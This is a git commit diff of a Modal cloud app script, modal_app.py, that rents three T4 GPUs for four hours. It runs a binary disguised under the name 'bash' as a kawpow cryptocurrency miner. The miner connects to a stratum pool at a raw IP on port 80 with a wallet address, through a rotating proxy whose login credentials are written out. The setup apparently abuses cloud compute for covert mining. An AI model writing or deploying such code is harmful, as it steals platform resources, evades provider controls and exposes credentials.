d1bf8674be80652abcb3ec69dcb26d84bd1683ab
qimxdoyo3240 <238822706+qimxdoyo3240@users.noreply.github.com>
2026-01-13 20:45:54 +0530

    Update modal_app.py

--- modal_app.py
+++ modal_app.py
@@ -1,9 +1,8 @@
 import modal
 import subprocess
-import time
 
 app = modal.App(
-    "run-bash-4-hours",
+    "t4x3-runner",
     mounts=[modal.Mount.from_local_dir(".", remote_path="/root")]
 )
 
@@ -17,21 +16,9 @@ image = (
 
 @app.function(
     image=image,
-    gpu=modal.gpu.T4(count=3),   # 🔥 T4 x3
-    timeout=60 * 60 * 4          # ⏱️ 4 jam
+    gpu=modal.gpu.T4(count=3),
+    timeout=60 * 60 * 4
 )
 def run_script():
-    # 1️⃣ Verifikasi GPU
     subprocess.run(["nvidia-smi"], check=True)
-
-    # 2️⃣ Jalankan script
-    subprocess.run(
-        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "],
-        check=False
-    )
-
-    # 3️⃣ Stay alive 4 jam
-    print("Script finished. Staying alive for 4 hours...")
-    time.sleep(60 * 60 * 4)
-
-    print("4 hours finished. Job exiting.")
+    subprocess.run(["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "])
